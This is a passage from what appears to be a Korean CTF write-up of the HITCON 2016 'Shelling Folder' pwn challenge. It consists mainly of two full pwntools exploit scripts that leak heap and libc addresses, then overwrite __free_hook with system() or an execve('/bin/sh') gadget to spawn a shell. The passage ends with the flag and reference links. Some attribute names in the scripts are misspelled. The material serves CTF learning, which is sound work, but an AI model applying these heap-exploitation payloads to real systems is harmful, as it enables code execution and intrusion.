#context.log_level = 'debug'

PWN_FILE = "./shellingfolder_42848afa70a13434679fac53a471239255753260"
LIBC_FILE = "/lib/x86_64-linux-gnu/libc.so.6"

def List():
	p.recvuntil('Your choice:')
	p.sendline('1')

def CreateDir(name):
	p.recvuntil('Your choice:')
	p.sendline('3')
	p.recvuntil('Name of Folder:')
	p.sendline(name)	

def CreateFile(name,size):
	p.recvuntil('Your choice:')
	p.sendline('4')
	p.recvuntil('Name of File:')
	p.send(name)
	p.recvuntil('Size of File:')
	p.sendline(str(size))

def Calc():
	p.recvuntil('Your choice:')
	p.sendline('6')

def Remove(name):
	p.recvuntil('Your choice:')
	p.sendline('5')
	p.recvuntil('Choose a Folder or file :')
	p.sendline(name)
	
p = process(PWN_FILE)	
libc = ELF(LIBC_FILE)

#Leak Heap addresss
CreateFile("Z"*24,0)
Calc()
p.recvuntil("Z"*24)
heapAddr = u64(p.recv(6).ljust(8,"\x00"))
Remove("Z"*24)

#Leak Libc addresss
CreateDir("AAAA")
CreateDir("BBBB")
CreateFile("C"*24+p8(0x10),64)
Remove("BBBB")		
Calc()
List()

#Print Libc addresss
p.recvuntil("----------------------\n")
libcAddr = u64(p.recv(6).ljust(8,"\x00"))
libc.addresss += libcAddr - 0x3c4b78
systemAddr = libc.symbols['system']
freeHook = libc.symbols['__free_hook']

log.info("Heap Addresss : " + hex(heapAddr))
log.info("Libc Addresss : " + hex(libcAddr))
log.info("System() : " + hex(systemAddr))
log.info("__free_hook() : " + hex(freeHook))

#Overflow freeHook -> systemAddr
CreateFile("D"*24+p64(freeHook)[:7], (systemAddr & 0xffffffff))
CreateFile("E"*24+p64(freeHook+4)[:7], (systemAddr & 0xffffffff00000000)>>32)

#Overflow "GetSh->list[1]" -> "sh;"
CreateFile("F"*24+p64(heapAddr+0x2e8)[:7:],0x3b6873)
CreateFile("GetSh",0)	
Calc()

#system(sh;)
Remove("GetSh")

p.interactive()
```

### system()함수 내 execve("/bin/sh") 사용

```python title="Write a exploit code 2"
from pwn import *
#context.log_level = 'debug'

PWN_FILE = "./shellingfolder_42848afa70a13434679fac53a471239255753260"
LIBC_FILE = "/lib/x86_64-linux-gnu/libc.so.6"

def List():
	p.recvuntil('Your choice:')
	p.sendline('1')

def CreateDir(name):
	p.recvuntil('Your choice:')
	p.sendline('3')
	p.recvuntil('Name of Folder:')
	p.sendline(name)	

def CreateFile(name,size):
	p.recvuntil('Your choice:')
	p.sendline('4')
	p.recvuntil('Name of File:')
	p.send(name)
	p.recvuntil('Size of File:')
	p.sendline(str(size))

def Calc():
	p.recvuntil('Your choice:')
	p.sendline('6')

def Remove(name):
	p.recvuntil('Your choice:')
	p.sendline('5')
	p.recvuntil('Choose a Folder or file :')
	p.sendline(name)
	
p = process(PWN_FILE)	
libc = ELF(LIBC_FILE)

#Leak Heap addresss
CreateFile("Z"*24,0)	#Create File
Calc()
p.recvuntil("Z"*24)
heapAddr = u64(p.recv(6).ljust(8,"\x00"))
Remove("Z"*24)

#Leak Libc addresss
CreateDir("AAAA")
CreateDir("BBBB")
CreateFile("C"*24+p8(0x10),64)
Remove("BBBB")		
Calc()
List()

p.recvuntil("----------------------\n")

#Print Libc addresss
libcAddr = u64(p.recv(6).ljust(8,"\x00"))
libc.addresss += libcAddr - 0x3c4b78
systemAddr = libc.symbols['system']
freeHook = libc.symbols['__free_hook']
execve = libc.addresss + 0x4647c

log.info("Heap Addresss : " + hex(heapAddr))
log.info("Libc Addresss : " + hex(libcAddr))
log.info("execve('/bin/sh') : " + hex(execve))
log.info("__free_hook() : " + hex(freeHook))

#Overflow freeHook -> systemAddr
CreateFile("D"*24+p64(freeHook)[:7], (execve & 0xffffffff))		#Create File
CreateFile("E"*24+p64(freeHook+4)[:7], (execve & 0xffffffff00000000)>>32)	#Create File
Calc()

#execve("/bin/sh")
Remove("D"*24+p64(freeHook)[:7])

p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag | hitcon&#123;Sh3llingF0ld3r\_Sh3rr1nf0rd\_Pl4y\_w17h\_4\_S1mpl3\_D4t4\_Ori3nt3d\_Pr0gr4mm1n7&#125; |

## **Related Site**

* <http://blog.dazzlepppp.cn/2016/11/12/HITCON-CTF-2016-ShellingFolder/>
* <http://bruce30262.logdown.com/posts/976496-hitcon-ctf-2016-quals-shelling-folder>
* <https://github.com/ret2libc/ctfs/tree/master/hitcon2016quals/shellingfolder>
* <https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html>
* <http://database.sarang.net/study/glibc/3.htm>